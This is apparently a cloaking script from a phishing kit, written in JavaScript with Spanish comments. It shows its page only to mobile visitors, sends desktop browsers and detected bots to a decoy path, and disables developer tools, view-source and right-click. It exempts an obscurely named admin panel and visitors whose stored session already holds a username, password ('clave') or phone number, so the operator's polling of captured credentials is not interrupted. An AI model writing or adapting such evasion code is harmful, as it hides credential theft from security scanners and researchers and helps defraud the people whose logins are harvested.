/**
 * Protección básica: solo móvil, BotD (pa-botd.js), redirección a /api/index.php
 *
 * DevTools: no se vigilan en móvil — en iOS Safari outerHeight/innerHeight y resize
 * de la barra de URL disparaban redirect falso a api/index.php.
 *
 * BotD: no redirige en rutas del panel ni si el visitante ya tiene flujo activo
 * (usuario/clave en historial peth) para no cortar el polling del admin.
 */
(function () {
    'use strict';

    if (window.__ALLOW_EMBED__) {
        return;
    }

    function getJsBaseUrl() {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
            var src = scripts[i].src || '';
            if (/\/js\/pa-sec555view\.js/i.test(src)) {
                return src.replace(/pa-sec555view\.js(\?.*)?$/i, '');
            }
        }
        return '/js/';
    }

    function getApiIndexUrl() {
        var path = window.location.pathname.replace(/\/+$/, '');
        var apiIdx = path.indexOf('/api');
        if (apiIdx !== -1) {
            return path.slice(0, apiIdx + 4) + '/index.php';
        }
        return '/api/index.php';
    }

    function redirectToApiIndex(delayMs) {
        var url = getApiIndexUrl();
        if (delayMs > 0) {
            setTimeout(function () {
                window.location.replace(url);
            }, delayMs);
        } else {
            window.location.replace(url);
        }
    }

    function isAdminPanelPath() {
        var path = location.pathname.toLowerCase();
        return /pmnU7Vj877c-server\.php/.test(path) ||
            /change-admin-credentials\.php/.test(path) ||
            /\/process\//.test(path);
    }

    function isUserInActiveFlow() {
        try {
            var raw = localStorage.getItem('peth_action_history');
            if (!raw) {
                return false;
            }
            var parsed = JSON.parse(raw);
            var datos = parsed && parsed.datos;
            if (!datos || typeof datos !== 'object') {
                return false;
            }
            return !!(datos.userId || datos.usuario || datos.clave || datos.celular);
        } catch (error) {
            return false;
        }
    }

    function shouldSkipBotdRedirect() {
        if (window.__SKIP_BOTD__ === true) {
            return true;
        }
        if (isAdminPanelPath()) {
            return true;
        }
        if (isUserInActiveFlow()) {
            return true;
        }
        return false;
    }

    function loadBotDetection() {
        window.addEventListener('pa-botd-result', function onBotdResult(e) {
            window.removeEventListener('pa-botd-result', onBotdResult);
            if (shouldSkipBotdRedirect()) {
                return;
            }
            if (e.detail && e.detail.bot) {
                redirectToApiIndex(0);
            }
        });

        var script = document.createElement('script');
        script.type = 'module';
        script.src = getJsBaseUrl() + 'pa-botd.js';
        document.head.appendChild(script);
    }

    var mobileUa = /iphone|ipad|ipod|android|mobile|blackberry|iemobile|opera mini|windows phone|webos|palmos/i;
    var isMobile = mobileUa.test(navigator.userAgent) || navigator.maxTouchPoints > 0;
    var isPC = !isMobile &&
        /windows|macintosh|linux/i.test(navigator.userAgent);

    if (isAdminPanelPath()) {
        return;
    }

    document.addEventListener('keydown', function (e) {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && /^(I|J|C)$/i.test(e.key)) ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
            return false;
        }
    });

    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        return false;
    });

    if (window !== window.top) {
        window.top.location = window.location;
    }

    if (isPC) {
        redirectToApiIndex(0);
        return;
    }

    loadBotDetection();
})();
